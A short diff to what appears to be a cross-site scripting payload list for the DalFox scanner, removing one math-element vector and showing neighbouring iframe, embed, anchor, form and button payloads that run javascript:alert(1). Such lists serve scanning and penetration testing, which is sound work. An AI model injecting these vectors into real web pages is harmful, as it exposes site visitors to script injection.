@@ -106,7 +106,6 @@ DalFox
 <iframe src=javascript:alert(1)> 
 <embed src=javascript:alert(1)> 
 <a href=javascript:alert(1)>click 
-<math><brute href=javascript:alert(1)>click 
 <form action=javascript:alert(1)><input type=submit> 
 <isindex action=javascript:alert(1) type=submit value=click> 
 <form><button formaction=javascript:alert(1)>click 
